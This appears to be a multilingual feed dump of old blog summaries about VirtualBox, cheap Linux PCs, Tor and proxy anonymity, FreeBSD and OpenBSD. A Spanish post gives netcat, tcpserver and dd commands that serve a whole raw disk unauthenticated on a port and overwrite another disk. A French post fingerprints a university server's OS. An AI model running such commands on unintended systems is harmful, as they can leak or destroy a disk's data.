Personally I do not feel particularly comfortable messing around with partitions but I have despite this managed multi boots in the past and this through gParted (a Partition Editor application). I found that handling the partitions on my computer was both discouraging and confusing and not all too simple either. The program I am about to present handles multi operating systems with a sense of alleviation since it does not include managing of partitions. Instead it runs on the desktop (Windows and Linux), it is installed inside the Windows or Linux installation and runs like any other program on your computer. 
 VirtualBox is one option to dual/multi boot: VirtualBox is a commercial and proprietary X86 virtualization software package produced by German software company innotek GmbH. VirtualBox supports Linux, Mac OS X, OS/2 Warp (experimental OSE builds), Windows, and OpenSolaris hosts. Supported guest operating systems include FreeBSD, Linux, OpenBSD, OS/2 Warp, Windows and Solaris. In January 2007, after several years of development, VirtualBox OSE (Open source edition), a limited, open-source version, was released under the GNU General Public License (GPL). — Continue to read about VirtualBox on Wikipedia: Link or on the VirtualBox Home Page where VirtualBox also can be downloaded from: Link 
The pros I find in this arrangement: 

(The great) Option to use dynamically expanding disc space for the virtual OS.
No handling of partitions.
(Using WindowsXP) I am still logged on my favorite OS (Kubuntu Gutsy + KDE4) while having the unlimited benifits from WindowsXP contary to Wine & Wine-Doors which are much limited.

Tip: 
To change the size of your virtualbox; change the screen resolution within the virtual OS.]]></summary>

  <title><![CDATA[Billiga Datorer]]></title>
  <summary><![CDATA[Jag fick/köpte min första dator när jag var 12 år. Jag fick själva datorn men fick betala skärmen själv, jag tror det var för jag skulle få lära mig pengarsvärde. För en tolvåring var 2000 kr mycket mycket pengar...  Sen dess har jag avverkat en heldel olika datorer och den pryl som betytt mest för mig och mitt val av framtida karriär är nog just datorn.  Något som fascinerar mig är teknikens utveckling och hur mycket billigare datorer blir på bara ett halvår. När jag var 14 år praktiserade jag i en datorbutik och sålde en värsting dator för 30 000:- Hur ofta köper hemmaanvändare ny dator för det priset idag?  Nu för tiden kan man köpa en ny dator för ca 3000 kr. Walmart säjer en för $199. Den kör gos, en variant av linux, som operativsystem och gränssnittet verkar vara riktigt snyggt. Datorn är ingen värsting men för "vanligt" folk som surfar på internet, betalar räkningar och skriver lite i "word" duger den. Egentligen duger den till alla som inte spelar spel.  Skärm  ingår inte men  det är  ändå en fungerade dator för under 1500 kr. Ungefär vad ett par jeans kostar. Hur kan det vara möjligt? Datorer verkar följa teorin om tillgång och efterfrågan, precis som olja och spannmål... Vad jeans följer för teori har jag ingen aning om.  En stor del av kostnaden för datorutrusting utgörs av mjukvara. Walmart löste problemet med att skicka med gos. Samtidgt som det följer med programvara för bla ordbehandling som också är open source och därmed gratis. Om man verkligen ska pressa totalkostnaden för kunden så måste man satsa på det billigaste alternativet och det är open source programmvara. Den finns redan och alla som vill använda den kan göra det gratis.  Så för dig som vill spara pengar nästa gång du köper dator, köp en utan operativsystem (windows) och strunta i Microsoft Office. Ladda ner någon linuxvariant och något gratis officepaket. Min favorit är Ubuntu och OpenOffice till vardags, även om jag har en "nörddator" med OpenBSD.]]></summary>

  <title><![CDATA[Navegar anónimamente. Parte II]]></title>
  <summary><![CDATA[Bueno ya estamos otra vez aquí. Este documento es una continuación de la primera parte: "Navegar anónimanente". Lo podeis encontrar aquí. Para los que ya sepan de que va esto, en este segundo capítulo dedicado al anonimato, hablaremos sobre como crear una secuencia de proxys anónimos para hacer más difícil nuestra identificación dentro de internet.  La primera opción para el anonimato que tenemos seria la siguiente: configuramos nuestro navegador y le indicamos que todas nuestras conexiones del tipo HTTP (también podrian ser otras como FTP, SSL... ) pasen por un servidro proxy (que hallamos previamente elegido nosotros). Para ello, si Firefox es nuestro navegador predeterminado, tendremos que ir a Opciones-->Preferencias-->Red-->Configuración y en el apartado "Configurar proxies para el acceso al internet" poner la ip del proxy y el puerto por el que nos va a escuchar. Para los que usen IE las opciones y menus son muy parecidos.  Esta es la configuración más fácil (muy parecida a la que hacíamos al final de la primera parte), y por lo tanto la que menos "enmascara" nuestra identidad real (nuestra ip). Si nuestra idea es tener una lista de proxies (para con un simple clic pasar de un proxy a otro y no tener que entrar en las configuraciones del naveagador), Firefox tiene un add-on que nos facilita la tarea de tener una lista de proxies. La herramienta en cuestión se llama "SwitchProxy Tool". Una vez descargada e instalada, tendremos otra barra de herramientas dedicada especialmente para el uso del programa. Su uso es sencillo. Podemos agragegar cuantos proxies queramos a la lista de proxies, para después seleccionar uno y haciendo clic en el botón "apply" hacer que nuestro tráfico HTTP se redirija hacia el proxy. De esta forma tan sencilla haremos que nuestro fujo de datos pase primero por el proxy antes de llegar al destino. Para encontrar nuestro servidro proxy favorito, sabemos que en internet existen sitios donde podremos encontrar listas de proxys anónimos (p.e: http://proxy-list.org/en/); solo hay que googlear un poco.  Otra opción bastante interesante de "SwitchProxy Tool" es la posibilidad de cargar una lista de proxies (en vez de introducirlos uno a uno) y hacer que cada x segundos nuestras comunicaciones vayan cambiando el proxy utilizado de acuerdo con la lista que tenemos. Para poder utilizar esta opción tendremos que descargarnos primero la lista de proxies que vamos a utilizar. En la página http://proxy-list.org/en/ podemos encontrar dichas listas (También existes programas como Proxy Switcher que puede descargarnos una lista de proxies de internet, testearlos y ordenarlos). Ahora seleccionaremos la opción "Add" de la barra de herramientas de SwitchProxy Tool y la opción "Anonymous". En la siguiente ventana es donde podremos importar el archivo con la lista y indicarle cada cuantos segundos queremos que cambie entre proxy y proxy. Es importante comprobar que los proxies funcionan todos correctamente, ya que si no podríamos quedarnos sin conexión.  Como hemos visto, las herramientas antes presentadas se basan pasar el tráfico por un único proxy y aunque podemos cambiar el servidor proxy por el que navegamos cada x segundos, no enmascara del todo nuestra ip. Otra opción diferente serian las herramientas que crean una cadena larga de proxies entre el origen y el destino por donde hacen pasar nuestras consultas. Una de las herramientas que usa esa tecnología es TOR, que hoy por hoy es sin duda la herramienta más usada en este sentido.  TOR (The Onion Router) es una red de multi-enrutadores que basa su concepción en que la comunicación entre origen y destino salta por varios de ellos de forma encriptada (excepto entre el último tramo y destino, detalle muy importante) sin que ninguno de ellos conozca de forma completa origen y destino, sino sólo el enrutador predecesor y el sucesor. De esta forma evitaremos que los sitios web rastreen nuestra presencia. Para saber a que quién conectarse, se usará un servidor de directorio que nos indicará a las personas que me puedo conectar. En la siguiente imagen podemos ver el funcionamiento de Tor.  La red Tor se apoya en voluntarios que donan ancho de banda. Cuanta más gente ejecute servidores, más rápida será la red Tor. Si queremos ayudar a la comunidad y hacer de nuestro servidor un servidor Tor, aquí tenemos como: https://www.torproject.org/docs/tor-doc-server.html.es.  Por otra parte si lo que queremos es solo utilizar Tor, basta con descargarnos el add-on que existe para Firefox llamado TorButton. Además de instalarnos el TorButton, debemos también de instalarnos otro programa: Privoxy y el programa para Windows Tor. Privoxy filtra todo tipo de datos que se utilizan en la navegación web: cookies, encabezados; y además hace las preticiones DNS que algunos exploradores fallan al hacerlas. En vez de descargarnos el programa ensí, podemos bajarnos un paquete llamado Vidalia, que incluye el Privoxy y el programa para windows Tor. Una vez instalado Vidalia, si ejecutamos Firefox. Le damos al TorButton y lo ponemos "Enable". Deberemos apreciar una reducción en la velocidad de navegación (recordar TorButton no funcionará sino instalamos Vidalia ya que necesita privoxy). Para confirmar que estamos dentro de una red Tor solo tenemos que visitar esta página, la cual nos dirá si estamos o no dentro de la red Tor.  También cabe la posibilidad de utilizar Tor junto a SwitchProxy y a Privoxy. Es decir, dentro de la lista de poxies que tenemos en Switch Proxy tendremos un elemento más que será Tor. En la página web del proyecto explican muy detalladamente como se hace; no es nada difícil. El enlace es el siguiente.  Con todo esto ya tenemos una potente herramienta para el anonimato, aunque cabe recordar que este no 100% seguro en ningun caso.  Por último solo comentar un par de cosas que me parecen interesantes. Existe un paquete llamado Torparck, que incluyen las siguientes herramientas: el navegador Portable Firefox y un cliente para la red anónima Tor. Ocupa tan solo unos 10Mb, lo que nos permitirá grabarlo en nuestra memória USB y llevarlo a todas partes con nosotros para poder navegar anónimamente en cualquier sitio donde estemos. Por otro lado, también existe una distribución Linux (en formato Live-CD) basada en OpenBSD que trata de facilitar la navegación anónima. Su nombre es Anonym.OS.  Espero que esta guía sea de ayuda Nos vemos pronto :).  Un Saludo.]]></summary>

  <title><![CDATA[FreeBSD resources]]></title>
  <summary><![CDATA[FreeBSD useful links and books  I've been using FreeBSD since 2004 and the version at the time was 5.2, if I am not mistaken. To start using any operating system, one needs some guidance in form of documentation. FreeBSD handbook  and the best in the industry man pages were an excellent start point. However after a while I realized that it wasn't enough and I started looking for more information. At about the same time I bought Michael Lucas'  "Absolute  BSD"  from Amazon.ca and discovered  Dru Lavigne's FreeBSD Basics page . Both of those gave me plenty of information, so much that I couldn't absorb some of it. After a while I became curious of "BSD Hacks", a book written by Dru Lavigne which has a hundred really amazing tips, mostly applicable to Free/Net/OpenBSD, as well as other UNIX and UNIX-like systems. I purchased it November last year, from Amazon as well. Some time last year, Greg Lehey decided to release his "The Complete FreeBSD" under Creative Commons license. I downloaded the pdf version and found it to be an excellent complement to the "Absolute BSD", as Michael Lucas for example doesn't have a mention of the absolutely essential portupgrade utility in his book. Mr. Lehey also has an in-depth chapter of XFree86 (Xorg now) configuration. I hope that someone continues maintaining "The Complete FreeBSD" in the future. Soon I am going to order/preorder M. Lucas' next book "Absolute FreeBSD" which is supposed to cover version 7 of this excellent operating system.  I forgot to mention the FreeBSD mailing lists, to which a lot of experienced FreeBSD sysadmins and users are subscribed. I mostly use the freebsd-questions list , where  I get very helpful answers and very promptly too,  however there are many more lists   organized by topics, be it hardware related, various important software that runs on FreeBSD or even features of the operating system.]]></summary>

  <title><![CDATA[¿Cómo hacer una configuración espejo?]]></title>
  <summary><![CDATA[Intro  Si tiene dos servidores con igual configuración de hardware y necesita que ambas tengan la misma configuración de sistema operativo (FreeBSD, OpenBSD, Linux, Windows, etc), puede seguir los siguientes pasos para lograrlo. La idea es publicar en "A" el contenido del disco duro en el puerto 5000 y desde "B" caerle al disco duro con el contenido de "A", esto lo lograremos usando netcat y dd. El resultado final será dos servidores con exactamente la misma instalación & configuración. Este procedimiento es muy útil cuando por algún motivo no es posible pegar un disco duro adicional a alguno de los servidores y hacer la copia de disco a disco.  Requisitos  » Paciencia. » Una copia de FreeSBIE.  Escenario  » A es el servidor instalado (fuente), su dirección IP es 192.168.0.10. » El disco duro de A, donde está freeBSD instalado es /dev/ad0. » B es el servidor sin instalar (destino), su dirección IP es 192.168.0.11. » El disco duro de B, donde se quiere copiar la imagen es /dev/ad0.  Instrucciones Servidor "A" » Aegurese tener instalado ucspi-tcp. » Ejecute:  # /usr/local/bin/tcpserver -vRHl 0 -c 1 192.168.0.10 5000 \ sh -c '/bin/dd if=/dev/ad0'  Servidor "B" » Bootee con una copia de FreeSBIE. » Inicie un shell, no es necesario levantar el modo gráfico. » Asegúrese que haya comunicación ente A y B. » Ejecute:  # /usr/bin/nc 192.168.0.10 \ 5000 | /bin/dd of=/dev/ad0  Ahora deberá esperar a que el proceso termine; este proceso puede tardar varias horas en completarse correctamente, por lo que deberá ser paciente y esperar.]]></summary>

  <summary><![CDATA[Aus diesem Beitrag  des OpenBSD-Gründers Theo de Raadt geht hervor, dass die aktuellen Core 2 Duo Prozessoren von Intel wohl mit schwerwiegenden Bugs zu kämpfen haben. 
 
Software-Fehler lassen sich über Patches fixen, einige CPU-Fehler wohl durch Dinge wie BIOS-Updates und Software-Pachtes (ich bin kein Hardware-Mensch ), aber was macht man mit den Fehlern, die sich nicht beheben lassen und die eine schwerwiegende Sicherheitslücke darstellen? Neue CPU kaufen? Wenn Intel mir das Geld gibt ... .  
 
 Das heißt natürlich nicht, das AMD CPUs bugfrei sind, aber mein jetziger alter Athlon scheint wohl sicherer zu sein, als die neuen Intels ... und wohl auch als AMDs neue CPUs, wie das letzte Statement wohl schließen lässt. Es gibt also noch Argumente gegen einen neuen PC . 
 
Update: Für alle, die das Thema genauer interessiert, hat heise einen ausführlichen  Artikel parat. Ich bin allerdings noch nicht dazu gekommen, ihn mir selber durch zu lesen .]]></summary>

  <title><![CDATA[OpenBSD, dos fallos de seguridad remotos en diez años]]></title>
  <summary><![CDATA[OpenBSD, el sistema operativo derivado de Unix (perteneciente a la familia *BSD, como NetBSD o FreeBSD) se ha visto obligado a cambiar su eslogan “bandera” por segunda vez desde que orgullosos, lo colgaron bien visible en su página como símbolo de un sistema pensado para la seguridad. En junio de 2002, cuando la frase ya hablaba de “seis años sin agujeros remotos”, el eslogan tuvo que ser modificado de nuevo. Se encontró un grave fallo de seguridad en OpenSSH que permitía a un atacante remoto obtener total control del sistema. Desde entonces hasta el pasado día 17 de marzo, se podía leer “sólo un agujero de seguridad en la instalación por defecto en más de 10 años”. El problema ha surgido, no sin polémica, cuando se ha descubierto una nueva vulnerabilidad en la pila Ipv6 de OpenBSD.Muchos administradores de OpenBSD también, muy concienciados con la seguridad, deshabilitaban este protocolo si no iba a ser utilizado. Los descubridores del problema hablaban de vulnerabilidad desde un principio, mientras que OpenBSD prefirió llamarla “bug” (fallo) y más tarde “problema de estabilidad”. Aun así, con ciertas reservas, OpenBSD se ha visto obligado a modificar su eslogan, donde ahora se puede leer “sólo dos agujeros de seguridad remotos en la instalación por defecto en más de diez años”, algo que no todos los proyectos pueden permitirse afirmar y de lo que siguen pudiendo sentirse orgullosos.La actual versión OpenBSD 4.0 seguirá presentándose como uno de los sistemas más seguros para servidores, donde la seguridad y estabilidad como objetivo primen por encima de todo.]]></summary>

  <title><![CDATA[Who said running OpenBSD needs huge hardware?]]></title>
  <summary><![CDATA[This morning, a close friend of mine told me that his customer doesn't want OpenBSD in their system. Instead they shift to RedHat because they *thought* GNU/Linux will run on less hardware requirements.  I told my friend that i have an old P2 450 with 64Mb (yes, it's an old lad) running OpenBSD smoothly and i haven't upgrade it to the latest version since..ermmm years ago!  A huge myth about BSD OS is "If it's fo server, it's expensive on hardware". True if you want to run several huge server supporting 80 million hits per day but for a small server, OpenBSD is the rock-solid choice.  I'm not saying GNU/Linux sucks at this area but we have tested Red Hat (at their early stage) running side-by side with OpenBSD and OpenBSD shows no break in. Red Hat got ping-bombed after a week of getting it config. I'm sure Red Hat getting better nowdays but with only one security hole in 8 years, you have to give OpenBSD credit.  [A few] years ago I was just getting into system administration. I learned Linux first. Then one of our old (I mean *really* old) BSDi servers crashed, and it was up to me to rebuild the system.  I looked at FreeBSD, NetBSD, OpenBSD and Linux. In the end, it came down to "secure and stable" that took the prize. OpenBSD 2.1 was installed.  Since then, I've run 2.1-2.5 on everything from production servers to laptops. We've never (repeat: NEVER) had a break-in.  A coworker setup a RedHat based box to test his skills at setting up SSL and a secure web site. It was hacked literally overnight, and by the next morning was attacking other sites.  Our OpenBSD servers were probed and then left alone. In the intervening two years, that original server got upgraded and patched several times and the OS never gave us reason to question the reliability or security of OpenBSD.  We have another box, acting as a router for about 800 workstations doing very basic filtering and NAT. It's on a P120 with 32MB RAM and typically the uptime would look like this:  % uptime  9:05PM  up 266 days,  4:23, 1 user, load averages: 0.06, 0.06, 0.06 %  As well, OpenBSD runs on my laptop. A Gateway Solo 2500 with a Xircom modem, and a Linksys fast Ethernet NIC. And it never crashes :) - via OpenBSd  BSD community is head to head with GNU/Linux now and i do hope BSD will hit the checkered flag. If OpenBSD (or any BSD flavour) wants to win desktop market and users, it is important to update their hardware support.]]></summary>

Le site est tests.eila.jussieu.fr: 
HTTP/1.1 200 OK 
Server: Apache 
 
Le serveur d'authentification est un OpenBSD 3.X (87%) ou NetBSD (85%), et fournit une interface web sous SPIP. 
 
Le minimum que l'on puisse dire, c'est qu'ils apparaissent un minimum sensibles au libre. Cela parait normal, vu les recommendations du gouvernement, non? 
 
Le test, obligatoire car établissant le classement par niveau pendant les cours, se presente sous la forme: 
 
 
C'est beau, c'est meme magnifique, utilisation d'une technologie proprietaire necessaire pour entrer dans une universite nationale. 
 
La ou ca devient carrement Kafkaïen, c'est qu'apparement c'est du flash8, même si ma soeur a le plugin Flash (7) pour GNU/Linux sur sa machine (sapusaipaslibre mais bon...), et bien ce test ne passe tout simplement PAS.
